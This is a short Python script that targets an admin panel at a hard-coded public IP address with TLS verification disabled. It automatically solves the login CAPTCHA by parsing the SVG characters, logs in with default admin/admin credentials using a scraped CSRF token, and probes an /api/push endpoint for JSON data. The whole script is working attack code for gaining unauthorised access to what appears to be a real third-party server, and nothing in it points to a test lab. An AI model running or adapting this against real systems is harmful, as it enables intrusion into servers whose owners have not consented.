#!/usr/bin/env python3
"""
Check for actual API responses by looking for JSON markers
"""

import requests
import re
import json

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login
r = sess.get(f"{TARGET}/admin/login", timeout=10)
token = re.search(r'name="_token" value="([^"]+)"', r.text)
if not token:
    exit(1)
csrf_token = token.group(1)

r_captcha = sess.get(f"{TARGET}/admin/captcha", timeout=10)
captcha = ''.join(re.findall(r'<text[^>]*>([A-Z0-9])</text>', r_captcha.text))

sess.post(f"{TARGET}/admin/login", data={
    'username': 'admin',
    'password': 'admin',
    'captcha': captcha,
    '_token': csrf_token
}, allow_redirects=False, timeout=10)

# Check if response contains JSON or API data markers
r_push = sess.post(f"{TARGET}/api/push", data={
    '_token': csrf_token,
    'message': 'test',
    'type': 'test'
}, timeout=10)

# Look for API indicators
apis_found = re.findall(r'"api[^"]*"', r_push.text)
services_found = re.findall(r'"service[^"]*"', r_push.text)
endpoints_found = re.findall(r'"endpoint[^"]*"', r_push.text)

print(f"API mentions found: {apis_found}")
print(f"Service mentions: {services_found}")
print(f"Endpoint mentions: {endpoints_found}")

# Try looking for actual data in response
if '{"' in r_push.text or '{"' in r_push.text:
    print("JSON data found in response!")
else:
    print("No JSON data found in response")